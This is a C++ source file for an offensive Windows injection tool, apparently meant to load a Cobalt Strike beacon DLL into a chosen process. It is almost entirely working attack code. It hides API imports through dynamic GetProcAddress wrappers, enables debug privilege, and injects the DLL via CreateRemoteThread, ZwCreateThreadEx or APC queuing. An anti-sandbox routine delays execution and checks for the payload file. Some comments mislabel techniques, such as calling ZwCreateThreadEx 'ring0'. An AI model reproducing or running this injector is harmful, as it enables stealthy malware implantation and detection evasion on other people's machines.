#include<iostream>
#include<tchar.h>
#include <cstring>
#include <filesystem>
#include<Windows.h>
#include<Tlhelp32.h>
using namespace std;

HANDLE Hide_OpenThread(
	_In_ DWORD dwDesiredAccess,
	_In_ BOOL bInheritHandle,
	_In_ DWORD dwThreadId
)
{
	typedef	HANDLE(WINAPI* Fn_OpenThread)(
		_In_ DWORD dwDesiredAccess,
		_In_ BOOL bInheritHandle,
		_In_ DWORD dwThreadId
		);
	HMODULE OpenThreadHandle = GetModuleHandleW(L"Kernel32.dll");
	Fn_OpenThread ptr = (Fn_OpenThread)GetProcAddress(OpenThreadHandle, "OpenThread");
	return ptr(dwDesiredAccess, bInheritHandle, dwThreadId);
}
HANDLE  Hide_CreateRemoteThread(
	_In_ HANDLE hProcess,
	_In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,
	_In_ SIZE_T dwStackSize,
	_In_ LPTHREAD_START_ROUTINE lpStartAddress,
	_In_opt_ LPVOID lpParameter,
	_In_ DWORD dwCreationFlags,
	_Out_opt_ LPDWORD lpThreadId
)
{
	typedef	HANDLE(WINAPI* FN_CreateRemoteThread)(
		_In_ HANDLE hProcess,
		_In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,
		_In_ SIZE_T dwStackSize,
		_In_ LPTHREAD_START_ROUTINE lpStartAddress,
		_In_opt_ LPVOID lpParameter,
		_In_ DWORD dwCreationFlags,
		_Out_opt_ LPDWORD lpThreadId
		);
	HMODULE CreateRemoteThreadHandle = GetModuleHandleW(L"Kernel32.dll");
	FN_CreateRemoteThread ptr = (FN_CreateRemoteThread)GetProcAddress(CreateRemoteThreadHandle, "CreateRemoteThread");
	return ptr(hProcess, lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId);
}

HANDLE Hide_OpenProcess(
	_In_ DWORD dwDesiredAccess,
	_In_ BOOL bInheritHandle,
	_In_ DWORD dwProcessId
)
{
	typedef HANDLE(WINAPI* Fn_OpenProcess)(
		_In_ DWORD dwDesiredAccess,
		_In_ BOOL bInheritHandle,
		_In_ DWORD dwProcessId
		);
	HMODULE OpenProcessHandle = GetModuleHandleW(L"Kernel32.dll");
	Fn_OpenProcess ptr = (Fn_OpenProcess)GetProcAddress(OpenProcessHandle, "OpenProcess");
	return ptr(dwDesiredAccess, bInheritHandle, dwProcessId);
}
DWORD Hide_QueueUserAPC(
	_In_ PAPCFUNC pfnAPC,
	_In_ HANDLE hThread,
	_In_ ULONG_PTR dwData
)
{
	typedef DWORD(WINAPI* Fn_QueueUserAPC)(
		_In_ PAPCFUNC pfnAPC,
		_In_ HANDLE hThread,
		_In_ ULONG_PTR dwData
		);
	HMODULE QueueUserAPCHandle = GetModuleHandleW(L"Kernel32.dll");
	Fn_QueueUserAPC ptr = (Fn_QueueUserAPC)GetProcAddress(QueueUserAPCHandle, "QueueUserAPC");
	return ptr(pfnAPC, hThread, dwData);

}
LPVOID Hide_VirtualAllocEx(
	_In_ HANDLE hProcess,
	_In_opt_ LPVOID lpAddress,
	_In_ SIZE_T dwSize,
	_In_ DWORD flAllocationType,
	_In_ DWORD flProtect
)
{
	typedef LPVOID(WINAPI* Fn_VirtualAllocEx)(
		_In_ HANDLE hProcess,
		_In_opt_ LPVOID lpAddress,
		_In_ SIZE_T dwSize,
		_In_ DWORD flAllocationType,
		_In_ DWORD flProtect
		);
	HMODULE	VirtualAllocExHandle = GetModuleHandleW(L"Kernel32.dll");
	Fn_VirtualAllocEx ptr = (Fn_VirtualAllocEx)GetProcAddress(VirtualAllocExHandle, "VirtualAllocEx");
	return ptr(hProcess, lpAddress, dwSize, flAllocationType, flProtect);
}

BOOL Hide_WriteProcessMemory(
	_In_ HANDLE hProcess,
	_In_ LPVOID lpBaseAddress,
	_In_reads_bytes_(nSize) LPCVOID lpBuffer,
	_In_ SIZE_T nSize,
	_Out_opt_ SIZE_T* lpNumberOfBytesWritten
) {
	typedef BOOL(*Fn_WriteProcessMemory)(
		_In_ HANDLE hProcess,
		_In_ LPVOID lpBaseAddress,
		_In_reads_bytes_(nSize) LPCVOID lpBuffer,
		_In_ SIZE_T nSize,
		_Out_opt_ SIZE_T* lpNumberOfBytesWritten
		);

	HMODULE	WriteProcessMemoryHandle = GetModuleHandleW(L"KernelBase.dll");
	Fn_WriteProcessMemory ptr = (Fn_WriteProcessMemory)GetProcAddress(WriteProcessMemoryHandle, "WriteProcessMemory");
	return ptr(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten);
}



HANDLE Hide_CreateFileW(
	_In_ LPCWSTR lpFileName,
	_In_ DWORD dwDesiredAccess,
	_In_ DWORD dwShareMode,
	_In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes,
	_In_ DWORD dwCreationDisposition,
	_In_ DWORD dwFlagsAndAttributes,
	_In_opt_ HANDLE hTemplateFile
)
{
typedef	HANDLE(WINAPI * Fn_CreateFileW)(
		_In_ LPCWSTR lpFileName,
		_In_ DWORD dwDesiredAccess,
		_In_ DWORD dwShareMode,
		_In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes,
		_In_ DWORD dwCreationDisposition,
		_In_ DWORD dwFlagsAndAttributes,
		_In_opt_ HANDLE hTemplateFile
		);
	HMODULE	CreateFileHandle = GetModuleHandleW(L"kernel32.dll");
	Fn_CreateFileW ptr = (Fn_CreateFileW)GetProcAddress(CreateFileHandle, "CreateFileW");
	return ptr(lpFileName,dwDesiredAccess,dwShareMode,lpSecurityAttributes,dwCreationDisposition,dwFlagsAndAttributes,hTemplateFile);
}

BOOL EnableDebugPrivilege()
{
	HANDLE hToken;
	BOOL fOk = FALSE;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		TOKEN_PRIVILEGES tp;
		tp.PrivilegeCount = 1;
		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
		fOk = (GetLastError() == ERROR_SUCCESS);
		CloseHandle(hToken);
	}
	return fOk;
}

DWORD GetProcessPID(LPCTSTR lpProcessName)
{
	DWORD Ret = 0;
	PROCESSENTRY32 p32;
	HANDLE lpSnapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (lpSnapshot == INVALID_HANDLE_VALUE)
	{
		printf("	[-] 获取进程快照失败,请重试! Error:%d", ::GetLastError());
		return Ret;
	}
	p32.dwSize = sizeof(PROCESSENTRY32);
	::Process32First(lpSnapshot, &p32);
	do {
		if (!lstrcmp(p32.szExeFile, lpProcessName))
		{
			Ret = p32.th32ProcessID;
			break;
		}
	} while (::Process32Next(lpSnapshot, &p32));
	::CloseHandle(lpSnapshot);
	return Ret;
}

void APCInject(DWORD pid, LPCWSTR dllpath)
{
	//1.获取句柄
	HANDLE TargetHandle = Hide_OpenProcess(PROCESS_ALL_ACCESS, NULL, pid);
	if (TargetHandle == NULL)
	{
		cout << "	[-] Get TargetProcessHandle Failed :(" << endl;
		if (EnableDebugPrivilege() == TRUE)
		{
			cout << "	[-] Is This EXE Opened? :(" << endl;
		}
		else {
			cout << "	[-] Please Run This Under Administrator Role :(" << endl;
		}
		return;
	}
	else {
		cout << "	[+] Get OriginalProcessHandle Successfully :)" << endl;
	}

	//2.远程申请内存
	DWORD length = (wcslen(dllpath) + 2) * sizeof(TCHAR);
	PVOID RemoteMemory = Hide_VirtualAllocEx(TargetHandle, NULL, length, MEM_COMMIT, PAGE_EXECUTE_READ);
	if (RemoteMemory == NULL)
	{
		cout << "	[-] VirtualAlloc Address Failed :(" << endl;
		return;
	}
	else {
		cout << "	[+] VirtualAlloc Address Successfully :)" << endl;
	}
	//3.将上线的DLL的路径写入内存

	BOOL WriteStatus = Hide_WriteProcessMemory(TargetHandle, RemoteMemory, dllpath, length, NULL);
	if (WriteStatus == 0)
	{
		cout << "	[-] Write CS's DLL Into Memory Failed :(" << endl;
		return;
	}
	else
	{
		cout << "	[+] Write CS's DLL Into Memory Successfully :)" << endl;
	}
	//4.获取LoadLibrary的函数地址
	FARPROC LoadLibraryAddress = GetProcAddress(GetModuleHandle(L"Kernel32.dll"), "LoadLibraryW");
	if (LoadLibraryAddress == NULL)
	{
		cout << "	[-] Get LoadLibrary's Address Failed :(" << endl;
		return;
	}
	else
	{
		cout << "	[+] Get LoadLibrary's Address Successfully :)" << endl;
	}
	//5.创建线程快照并且插入APC函数
	HANDLE SnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);
	if (SnapShot == INVALID_HANDLE_VALUE)
	{
		cout << "	[-] Taking Thread Snap Shot Failed :(" << endl;
		return;
	}
	else
	{
		cout << "	[+] Taking Thread Snap Shot Successfully :)" << endl;
	}
	//定义线程信息结构体,并且初始化
	THREADENTRY32 te = { 0 };
	te.dwSize = sizeof(te);
	//然后就是遍历快照中的线程,进行插入
	int flag = 0;                  //判断APC是否插入成功
	HANDLE ThreadHandle = NULL;    //用于获取目标线程句柄
	if (Thread32First(SnapShot, &te))
	{
		//不想do while循环,所以我就直接先进行一次
		//判断目标线程的进程ID是否是我们要注入的进程的ID
		if (te.th32OwnerProcessID == pid)
		{
			ThreadHandle = Hide_OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);  //获取目标线程的句柄
			if (ThreadHandle)
			{
				DWORD dwRet = Hide_QueueUserAPC((PAPCFUNC)LoadLibraryAddress, ThreadHandle, (ULONG_PTR)RemoteMemory);  //插入APC函数
				if (dwRet == TRUE)
				{
					flag++;
				}
			}
			ThreadHandle = NULL;  //清除句柄
		}

		while (Thread32Next(SnapShot, &te))  //遍历完毕就会停止
		{
			if (te.th32OwnerProcessID == pid)
			{
				ThreadHandle = Hide_OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
				if (ThreadHandle)
				{
					DWORD dwRet = Hide_QueueUserAPC((PAPCFUNC)LoadLibraryAddress, ThreadHandle, (ULONG_PTR)RemoteMemory);
					if (dwRet == TRUE)
					{
						flag++;
					}
				}
				ThreadHandle = NULL;  //清除句柄
			}
		}
		CloseHandle(TargetHandle);
		CloseHandle(SnapShot);
		CloseHandle(ThreadHandle);
		if (flag == 0)
		{
			cout << "	[-] APC Inj&ct Failed :(" << endl;
			return;
		}
		else
		{
			cout << "	[+] APC Inj&ct Successfully !! Enj0y Hacking Time :) !" << endl;
		}
	}
}


void DLLInject(DWORD pid, LPCWSTR dllpath)
{
	//1.获取句柄
	HANDLE OriginalProcessHandle = Hide_OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (OriginalProcessHandle == NULL)
	{
		cout << "	[-] Get TargetProcessHandle Failed :(" << endl;

		if (EnableDebugPrivilege() == TRUE)
		{
			cout << "	[-] Is This EXE Opened? :(" << endl;
		}
		else {
			cout << "	[-] Please Run This Under Administrator Role :(" << endl;
		}
		return;
	}
	else {
		cout << "	[+] Get OriginalProcessHandle Successfully :)" << endl;
	}
	//2.远程申请内存
	DWORD  length = (wcslen(dllpath) + 1) * sizeof(TCHAR);

	PVOID  RemoteMemory = Hide_VirtualAllocEx(OriginalProcessHandle, NULL, length, MEM_COMMIT, PAGE_EXECUTE_READ);

	if (RemoteMemory == NULL)
	{

		cout << "	[-] VirtualAlloc Address Failed :(" << endl;
		return;
	}
	else {
		cout << "	[+] VirtualAlloc Address Successfully :)" << endl;
	}
	//3.将CS上线的DLL写入内存
	BOOL WriteStatus = Hide_WriteProcessMemory(OriginalProcessHandle, RemoteMemory, dllpath, length, NULL);
	if (WriteStatus == 0)
	{
		cout << "	[-] Write CS's DLL Into Memory Failed :(" << endl;
		return;
	}
	else
	{
		cout << "	[+] Write CS's DLL Into Memory Successfully :)" << endl;
	}

	//4.获取LoadLibrary地址
	FARPROC LoadLibraryHandle = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
	//5.声明ZwCreateThreadEx函数
#ifdef _WIN64
	typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)(
		PHANDLE ThreadHandle,
		ACCESS_MASK DesiredAccess,
		LPVOID ObjectAttributes,
		HANDLE ProcessHandle,
		LPTHREAD_START_ROUTINE lpStartAddress,
		LPVOID lpParameter,
		ULONG CreateThreadFlags,
		SIZE_T ZeroBits,
		SIZE_T StackSize,
		SIZE_T MaximumStackSize,
		LPVOID pUnkown);
#else
	typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)(
		PHANDLE ThreadHandle,
		ACCESS_MASK DesiredAccess,
		LPVOID ObjectAttributes,
		HANDLE ProcessHandle,
		LPTHREAD_START_ROUTINE lpStartAddress,
		LPVOID lpParameter,
		BOOL CreateSuspended,
		DWORD dwStackSize,
		DWORD dw1,
		DWORD dw2,
		LPVOID pUnkown);
#endif
	//6.获取NTDLL中ZwCreateThreadEx函数
	typedef_ZwCreateThreadEx  ZwCreateThreadEx = (typedef_ZwCreateThreadEx)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "ZwCreateThreadEx");
	if (ZwCreateThreadEx == NULL)
	{
		cout << "	[-] Get ZwCreateThreadEx Address Failed :(" << endl;
		return;
	}
	else {
		cout << "	[+] Get ZwCreateThreadEx Address Successfully :)" << endl;
	}
	//5.创建线程 ring3调用CreateRemoteThread
	HANDLE RemoteHandle = Hide_CreateRemoteThread(OriginalProcessHandle, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryHandle, RemoteMemory, 0, NULL);
	if (RemoteHandle == NULL)
	{
		cout << "	[-] Ring3 Thread Inj&ct Failed :(" << endl;
		return;

	}
	else {
		cout << "	[+] Ring3 Thread inj&ct Successfully :)" << endl;
	}

	//7.创建线程  ring0调用ZwCreateThreadEx
	HANDLE hRemoteThread;
	DWORD Status = 0;
	Status = ZwCreateThreadEx(&hRemoteThread, PROCESS_ALL_ACCESS, NULL, OriginalProcessHandle, (LPTHREAD_START_ROUTINE)LoadLibraryHandle, RemoteMemory, 0, 0, 0, 0, NULL);
	if (Status == NULL)
	{
		cout << "	[+] Ring0 Thread Inj&ct Successfully :)" << endl;
	}
	else
	{
		cout << "	[-] Ring0 Thread Inj&ct Failed :(" << endl;
		return;
	}
	WaitForSingleObject(RemoteHandle, -1);
	//8.释放DLL空间
	VirtualFreeEx(OriginalProcessHandle, RemoteMemory, length, MEM_COMMIT);
	//9.关闭句柄
	CloseHandle(OriginalProcessHandle);
	CloseHandle(ZwCreateThreadEx);
	cout << "	[+] DLL inj&ct successfu11y !! Enj0y Hacking Time :) !" << endl;
}

void recursive_anti_sandbox(int i,long max_length)
{
	if (i > max_length)
	{
		cout << i;
		return;
	}
	recursive_anti_sandbox(i + 1, max_length);
	
}
BOOL AntiSandBox()
{
	//1. 循环+递归 输出延时
	long max_depth = 1000;
	for (long i = 1; i <= 20000; i++)
	{
		cout << i ;                              //输出垃圾数据,进行延时
		recursive_anti_sandbox(0, max_depth);
	}
	for(int i=1;i<=50;i++)
	{
		cout << endl;                         //清空界面
	}
	
	//2.检验特定的dll
	HANDLE  CheckCSHandle = INVALID_HANDLE_VALUE;
	
	CheckCSHandle = Hide_CreateFileW(L".//cs.dll", GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	cout << endl << 1 << endl;
	if (CheckCSHandle == INVALID_HANDLE_VALUE)
	{
		return 0;
	}
	cout << "	Anti SandBox Successfully :)" << endl;
	CloseHandle(CheckCSHandle);
	return 1;
}
int _tmain(int argc, TCHAR* argv[])
{
	if (argc == 3) {
		if (AntiSandBox() == 0)
		{
			cout << "	Dont't Run This In SandBox Or Check DLL:(" << endl;
			return 0;
		}
		cout << "	    Which kind of Inj&ction do you want?" << endl;
		cout << "	    [1]: DLLInj&ct" << endl << "	    [2]: APCInj&ct" << endl;
		int type = 0;
		cin >> type;
		if (type == 1)
		{
			HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
			SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_BLUE);
			std::cout << "▓█████▄  ██▓     ██▓     ██▓ ███▄    █  ▄▄▄██▓▓▓▓█████  ▄████▄  ▄▄▄█████▓\n";
			std::cout << "▓██▓ ██▌▓██▓    ▓██▓    ▓██▓ ██ ▓█   █    ▓██   ▓█   ▓ ▓██▓ ▓█  ▓  ██▓ ▓▓\n";
			std::cout << "▓██   █▌▓██▓    ▓██▓    ▓██▓▓██  ▓█ ██▓   ▓██   ▓███   ▓▓█    ▄ ▓ ▓██▓ ▓▓\n";
			std::cout << "▓▓█▄   ▌▓██▓    ▓██▓    ▓██▓▓██▓  ▓▌██▓▓██▄██▓  ▓▓█  ▄ ▓▓▓▄ ▄██▓▓ ▓██▓ ▓ \n";
			std::cout << "▓▓████▓ ▓██████▓▓██████▓▓██▓▓██▓   ▓██▓ ▓███▓   ▓▓████▓▓ ▓███▓ ▓  ▓██▓ ▓ \n";
			std::cout << " ▓▓  ▓ ▓ ▓▓▓  ▓▓ ▓▓▓  ▓▓▓  ▓ ▓▓   ▓ ▓  ▓▓▓▓▓   ▓▓ ▓▓ ▓▓ ▓▓ ▓  ▓  ▓ ▓▓   \n";
			std::cout << " ▓▓  ▓ ▓ ▓ ▓  ▓▓ ▓ ▓  ▓ ▓ ▓▓ ▓▓   ▓ ▓▓ ▓ ▓▓▓    ▓ ▓  ▓  ▓  ▓       ▓    \n";
			std::cout << " ▓ ▓  ▓   ▓ ▓     ▓ ▓    ▓ ▓   ▓   ▓ ▓  ▓ ▓ ▓      ▓   ▓          ▓      \n";
			std::cout << "   ▓        ▓  ▓    ▓  ▓ ▓           ▓  ▓   ▓      ▓  ▓▓ ▓                \n";
			std::cout << " ▓                                                     ▓                    \n";
			SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
			cout << "	    Under the sun,there is no secure system!!" << endl << "	        Scripted By Whoami@127.0.0.1  :》" << endl << "	          Color Picked By Icy Water :)" << endl;
			if (EnableDebugPrivilege() == TRUE)
			{

				cout << "-----------------------------!!START!!--------------------------------" << endl;
				cout << "	[+] Privilege Elevated Successfully, Now You Have Bypassed UAC :) " << endl;
			}
			else {
				cout << "-----------------------------!!START!!--------------------------------" << endl;
				cout << "	[-] Privilege Elevated Failed, You Haven't Bypassed UAC :( " << endl;
			}
			DWORD PID = GetProcessPID(argv[1]);
			DLLInject(PID, argv[2]);

		}
		else if (type == 2)
		{
			DWORD PID = GetProcessPID(argv[1]);
			HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
			SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN);
			std::cout << " ▄▄▄       ██▓███   ▄████▄      ██▓ ███▄    █  ▄▄▄██▓▓▓▓█████  ▄████▄  ▄▄▄█████▓\n"
				"▓████▄    ▓██▓  ██▓▓██▓ ▓█     ▓██▓ ██ ▓█   █    ▓██   ▓█   ▓ ▓██▓ ▓█  ▓  ██▓ ▓▓\n"
				"▓██  ▓█▄  ▓██▓ ██▓▓▓▓█    ▄    ▓██▓▓██  ▓█ ██▓   ▓██   ▓███   ▓▓█    ▄ ▓ ▓██▓ ▓▓\n"
				"▓██▄▄▄▄██ ▓██▄█▓▓ ▓▓▓▓▄ ▄██▓   ▓██▓▓██▓  ▓▌██▓▓██▄██▓  ▓▓█  ▄ ▓▓▓▄ ▄██▓▓ ▓██▓ ▓ \n"
				" ▓█   ▓██▓▓██▓ ▓  ▓▓ ▓███▓ ▓   ▓██▓▓██▓   ▓██▓ ▓███▓   ▓▓████▓▓ ▓███▓ ▓  ▓██▓ ▓ \n"
				" ▓▓   ▓▓█▓▓▓▓▓ ▓  ▓▓ ▓▓ ▓  ▓   ▓▓  ▓ ▓▓   ▓ ▓  ▓▓▓▓▓   ▓▓ ▓▓ ▓▓ ▓▓ ▓  ▓  ▓ ▓▓   \n"
				"  ▓   ▓▓ ▓▓▓ ▓       ▓  ▓       ▓ ▓▓ ▓▓   ▓ ▓▓ ▓ ▓▓▓    ▓ ▓  ▓  ▓  ▓       ▓     \n"
				"  ▓   ▓   ▓▓       ▓            ▓ ▓   ▓   ▓ ▓  ▓ ▓ ▓      ▓   ▓          ▓      \n"
				"      ▓  ▓         ▓ ▓          ▓           ▓  ▓   ▓      ▓  ▓▓ ▓                \n"
				"                   ▓                                          ▓                   \n";

			SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
			cout << endl << "	    Under the sun,there is no secure system!!" << endl << "	        Scripted By Whoami@127.0.0.1  :》" << endl << "	          Color Picked By Icy Water :)" << endl;
			if (EnableDebugPrivilege() == TRUE)
			{

				cout << "-----------------------------!!START!!--------------------------------" << endl;
				cout << "	[+] Privilege Elevated Successfully, Now You Have Bypassed UAC :) " << endl;
			}
			else {
				cout << "-----------------------------!!START!!--------------------------------" << endl;
				cout << "	[-] Privilege Elevated Failed, You Haven't Bypassed UAC :( " << endl;
			}
			APCInject(PID, argv[2]);

		}
		else {
			cout << "	    Please choose the number above :(" << endl;
			return 0;
		}

	}
	else
	{
		cout << "	[-] Two Parameters are required" << endl;
	}

	return 0;
}